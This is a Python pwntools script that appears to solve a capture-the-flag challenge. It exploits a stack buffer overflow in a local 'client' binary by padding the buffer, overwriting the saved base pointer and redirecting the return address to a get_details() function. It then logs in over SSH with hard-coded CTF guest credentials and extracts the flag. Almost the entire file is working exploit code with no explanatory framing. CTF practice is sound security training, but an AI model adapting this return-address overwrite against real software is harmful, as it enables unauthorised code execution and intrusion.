#!/usr/bin/env python3
from pwn import *

# Set binary context
context.binary = exe = ELF('./client', checksec=False)

# Get the address of get_details()
get_details = exe.symbols['get_details']
log.info(f"get_details() found at: {hex(get_details)}")

# Construct payload
payload = b"A" * 32  # Fill buffer
payload += b"B" * 8   # Overwrite saved RBP
payload += p64(get_details);

print("connecting")

p = ssh("guest", "localhost", password="CSSActf2025!", port=30202, timeout=5, raw=True)

io = p.shell()

io.recvuntil(b'Enter a command: ')

io.sendline(b"details 2 2025")  # This ensures month = 2, year = 2025

io.recvuntil(b'Enter a command: ')

io.sendline(payload)

match = io.recvregex(br"cssactf{.*}", capture=True)
print(f"GOT FLAG: {match.group(0).decode()}")

io.recvall()
p.close()
